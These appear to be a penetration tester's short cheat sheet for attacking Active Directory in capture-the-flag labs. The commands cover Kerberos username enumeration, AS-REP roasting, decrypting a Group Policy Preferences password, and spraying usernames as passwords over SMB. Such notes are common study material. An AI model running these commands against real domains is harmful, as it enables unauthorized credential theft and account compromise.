check if usernames are valid:
```
/opt/kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users.txt
```
- reformat with vim command `:%s/^.*VALID USERNAME:\s*\(\w\+\)@hutch\.offsec.*$/\1/`
- returns weird hash, use `GetNPUsers.py` instead to get hash

Kerberos, port 88
```
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>',userdb=<users_list_file>" <ip>
```

as-rep roast
```
GetNPUsers.py vulnnet-rst.local/ -no-pass -usersfile users.txt
```

decrypting group policy passwords
```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

try usernames as passwords:
```
nxc smb 10.129.231.149 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

try lowercase usernames as passwords:
- `cp users.txt users_lowercase.txt`
- vim command to convert all letters to lowercase
	- `:%s/[A-Z]/\L&/g`
```
nxc smb 10.129.42.194 -u users.txt -p users_lowercase.txt  --no-bruteforce --continue-on-success
```


